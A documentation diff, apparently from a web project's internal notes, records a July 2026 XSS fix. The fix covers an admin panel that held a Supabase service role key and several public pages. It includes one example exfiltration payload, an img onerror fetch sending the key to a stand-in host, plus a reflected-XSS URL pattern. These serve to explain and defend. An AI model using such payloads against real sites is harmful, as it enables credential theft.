@@ -38,7 +38,35 @@ The anon key is intentionally public — scoped by RLS policies. It is used in a
 SUPABASE_KEY      = anon key (above) — no longer used in admin.html as of June 2026
 SUPABASE_ADMIN_KEY = service role key (secret) — stored only in local admin.html, never in the repo
 ```
-All fetch calls in admin.html use `SUPABASE_ADMIN_KEY` for both reads and writes. The service role key bypasses RLS entirely, which is safe because admin.html is gitignored and runs locally only. Never put the service role key in any deployed file.
+All fetch calls in admin.html use `SUPABASE_ADMIN_KEY` for both reads and writes. The service role key bypasses RLS entirely. Never put the service role key in any deployed file.
+
+**Gitignoring admin.html is necessary but NOT sufficient.** An earlier version of this document said the service role key was "safe because admin.html is gitignored and runs locally only." That reasoning was wrong and it hid a critical vulnerability until July 2026. Gitignoring stops the key leaking *through the repo*. It does nothing to stop script *executing inside the page*, and "runs locally" is no protection either — the browser rendering admin.html has the key in scope and full network access to Supabase.
+
+The concrete attack: `buildSubmissionCard()` interpolated `employer_name`, `position_applied`, `review_general`, `review_best`, `review_worst`, and `submitter_email` straight into `innerHTML`. Those strings are written by anonymous strangers through submit.html. `login()` → `loadAll()` → `loadSubmissions("pending")` renders every pending row **on dashboard load, before any approve/reject decision**. So a submission containing `<img src=x onerror="fetch('https://evil.tld/?k='+SUPABASE_ADMIN_KEY)">` exfiltrates the service role key the moment the moderation queue paints — and rejecting it afterward is too late, the script already ran.
+
+**Manual moderation does not mitigate this.** The approval gate protects the *public site*; it cannot protect the *admin panel*, because reviewing a submission requires rendering it. Any design where a human reviews attacker-supplied text in a privileged page has this property.
+
+**Fix (July 2026):** `esc()` (defined just above `statusTag()`) HTML-escapes `& < > " '`. Every interpolation of submission-, review-, comment-, or third-party-API-derived data now goes through it — including the Clearbit autocomplete response in `lookupWebsite()`, which is untrusted input landing in the same privileged context. DB-generated integer IDs (`s.id`, `r.id`, `c.id`) are left unescaped; they are not attacker-controllable. **Rule going forward: any new `${...}` inside an `innerHTML` template string in admin.html must be wrapped in `esc()` unless it is a DB-generated integer.** The People's Ledger admin panel had the same defect in `s.business_name` and was fixed in the same pass.
+
+### Public-page XSS (fixed July 2026)
+
+The same unescaped-`innerHTML` pattern ran through all four public pages. Lower severity than the admin panel — no service role key on these pages — but still live XSS against every visitor.
+
+- **Reflected**, company.html: `companyName` is read from the `?name=` query string (`company.html:292`) and was interpolated raw into three `innerHTML` templates. `company.html?name=<img src=x onerror=...>` ran script for anyone who clicked the link — and those links are shareable, so it travelled.
+- **Stored**, all pages: `review_general`, `review_best`, `review_worst`, `position_applied`, `employer_name`, `industry` and `employer_website` rendered raw in `buildCard()` (index), `buildRow()` (leaderboard), the review map (company), and the entry template.
+- **Attribute-context**, several: `employer_website` sat inside `src="...favicons?domain=${...}"` and `href="${...}"`, where a `"` breaks out of the attribute. `score_band` sat inside `class="score-${band}"`, same problem.
+- **Autocomplete**, index.html: both dropdowns built `onclick="selectEmployer('...')"` with JS-string escaping only (`\\` and `'`), no HTML escaping — a `"` in an employer name broke the attribute. `highlightMatch()` sliced the raw name and re-inserted it around a `<strong>`.
+
+Each page now defines the same `esc()` helper. Two extra helpers where escaping alone is insufficient:
+
+- `safeUrl(url)` — link targets are restricted to `http(s)` before escaping, because escaping does **not** neutralize `javascript:` in an `href`. Anything else returns `#`. Used in company.html and entry.html.
+- `jsAttr(val)` (index.html) — for values landing in a quoted JS string inside an inline handler. Escapes for the JS string literal **then** for the HTML attribute; either layer alone is bypassable.
+
+Favicon URLs now use `encodeURIComponent()` on the domain rather than `esc()` — it is a URL parameter, so percent-encoding is both the correct handling and strictly safer here. `highlightMatch()` escapes both inputs *before* slicing, so the `<strong>` wrapper is the only markup that survives.
+
+`document.title = \`${companyName} ...\`` and `.textContent =` assignments are left unescaped **on purpose** — those are string properties, not parsed as HTML. Do not "fix" them; wrapping them in `esc()` would make `&amp;` show up literally in the tab title.
+
+**Rule going forward: same as admin.html — any new `${...}` inside an `innerHTML` template on a public page must go through `esc()`, `safeUrl()`, `jsAttr()` or `encodeURIComponent()` depending on context, unless it is a DB-generated integer.**
 
 ---
 
